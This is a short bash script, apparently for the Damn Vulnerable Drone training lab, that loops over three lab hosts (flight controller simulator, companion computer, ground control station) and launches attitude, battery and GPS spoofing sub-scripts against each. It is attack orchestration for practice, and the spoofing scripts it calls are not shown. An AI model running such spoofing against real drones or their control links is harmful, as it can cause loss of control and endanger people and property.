#!/bin/bash
# DVD Optimized Attack Script - Based on container analysis

# 실제 DVD 환경에서 동작하는 타겟들
TARGETS=(
    "10.13.0.2:5760"    # Flight Controller SITL
    "10.13.0.3:5760"    # Companion Computer
    "10.13.0.4:5760"    # Ground Control Station
)

# 공격 실행
for target in "${TARGETS[@]}"; do
    ip=$(echo "$target" | cut -d':' -f1)
    port=$(echo "$target" | cut -d':' -f2)
    
    echo "=== Attacking $target ==="
    
    # Attitude Spoofing
    echo "Running attitude spoofing..."
    timeout 30 sudo ./attitude_spoofing.sh "$ip" "$port" 30 &
    
    # Battery Spoofing  
    echo "Running battery spoofing..."
    timeout 30 sudo ./battery_spoofing.sh "$ip" "$port" 30 &
    
    # GPS Spoofing
    echo "Running GPS spoofing..."
    timeout 30 sudo ./gps_spoofing.sh "$ip" "$port" 30 &
    
    wait
    echo "Attack on $target completed"
    echo ""
done

echo "All attacks completed!"
